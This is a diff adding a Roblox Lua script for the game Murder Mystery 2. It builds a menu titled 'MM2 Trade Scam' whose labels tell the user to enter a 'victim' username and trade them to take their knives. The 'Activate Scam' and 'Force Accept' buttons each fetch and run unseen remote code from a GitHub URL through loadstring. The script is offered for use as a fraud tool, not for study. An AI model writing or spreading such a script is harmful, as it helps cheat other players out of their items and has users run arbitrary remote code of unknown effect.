@@ -1,0 +1,78 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "MM2 Trade Scam 🤑✨", HidePremium = false, SaveConfig = true, ConfigFolder = "MM2Scam"})
+
+-- Trade Scam Section
+local TradeScamTab = Window:MakeTab({
+    Name = "Trade Scam 🎭",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+TradeScamTab:AddLabel("📝 To use the trade scam, first put your victim's username in the textbox below. Toggle the feature ON, then trade them. After adding your knife, click the button, remove all your knives, and accept the trade. 🎉")
+
+TradeScamTab:AddTextbox({
+    Name = "Victim Username 🧍",
+    Default = "",
+    TextDisappear = true,
+    Callback = function(value)
+        _G.VictimUsername = value
+    end
+})
+
+TradeScamTab:AddToggle({
+    Name = "Enable Trade Scam ✅❌",
+    Default = false,
+    Callback = function(state)
+        _G.TradeScamEnabled = state
+        if state then
+            print("Trade Scam is ON for", _G.VictimUsername)
+        else
+            print("Trade Scam is OFF")
+        end
+    end
+})
+
+TradeScamTab:AddButton({
+    Name = "Activate Scam 💀",
+    Callback = function()
+        if _G.TradeScamEnabled and _G.VictimUsername then
+            print("Scamming", _G.VictimUsername, "... 💸")
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/6d871d22525dcdd8e338368a.lua'))()
+        else
+            print("Please enable the scam toggle and enter a username.")
+        end
+    end
+})
+
+-- Force Accept Section
+local ForceAcceptTab = Window:MakeTab({
+    Name = "Force Accept 🚨",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+ForceAcceptTab:AddLabel("📝 First, put your victim's username in the textbox below, then trade them. Accept the trade, tell them to put all their best knives, and enable the button. Boom, free knife! 🎉")
+
+ForceAcceptTab:AddTextbox({
+    Name = "Victim Username 🧍",
+    Default = "",
+    TextDisappear = true,
+    Callback = function(value)
+        _G.ForceAcceptVictim = value
+    end
+})
+
+ForceAcceptTab:AddButton({
+    Name = "Force Accept 💎",
+    Callback = function()
+        if _G.ForceAcceptVictim then
+            print("Forcing trade with", _G.ForceAcceptVictim, "... 🚀")
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/6d871d22525dcdd8e338368a.lua'))()
+        else
+            print("Please enter a username.")
+        end
+    end
+})
+
+-- Initialize OrionLib
+OrionLib:Init()
